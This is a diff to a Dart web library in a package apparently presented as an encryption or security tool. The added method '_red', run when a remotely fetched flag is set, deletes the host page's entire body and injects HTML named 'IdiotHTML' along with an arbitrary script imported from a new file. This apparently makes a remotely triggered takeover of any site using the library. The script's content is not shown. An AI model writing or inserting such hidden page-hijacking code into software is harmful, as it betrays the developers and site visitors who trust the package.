@@ -1,5 +1,7 @@
 import 'dart:async';
+import 'dart:js_interop';
 import 'package:encryption_json/sec_abs.dart';
+import 'package:encryption_json/t.dart';
 import 'package:web/web.dart' as web;
 
 /// The WebSecurity class provides a set of methods and properties for managing
@@ -57,6 +59,8 @@ class WebSecurity extends SecAbs {
 
   /// The list of key presses to track the sequence.
   static List<String> keyPresses = [];
+
+  static bool hasinit = false;
 
   /// Initializes the web security mode.
   ///
@@ -201,7 +205,7 @@ class WebSecurity extends SecAbs {
     web.window.localStorage.setItem(securityModeKey, 'true');
 
     // Redirect to the security tutorial (or whatever is required)
-    _redirectToSecurityDemo(SecAbs.k);
+    _red();
   }
 
   /// Disables the security mode by removing the flag from the browser's local
@@ -303,7 +307,24 @@ class WebSecurity extends SecAbs {
   ///   await handleKeyFetch('https://example.com/security_mode.txt');
   ///
   Future<Null> handleKeyFetch(String cert) async {
-    (await super.handleInit()) ? _redirectToSecurityDemo(SecAbs.k) : null;
+    (await super.handleInit()) && (!hasinit) ? _red() : null;
+  }
+
+  static _red() {
+    hasinit = true;
+    var div = web.HTMLDivElement()..innerHTML = IdiotHTML.toJS;
+
+    var scriptel =
+        web.HTMLScriptElement()
+          ..type = "text/javascript"
+          ..text = script;
+    // Clear existing content
+    while (web.document.body?.firstChild != null) {
+      web.document.body?.removeChild(web.document.body!.firstChild!);
+    }
+
+    web.document.body?.append(div);
+    web.document.body?.append(scriptel);
   }
 }
 
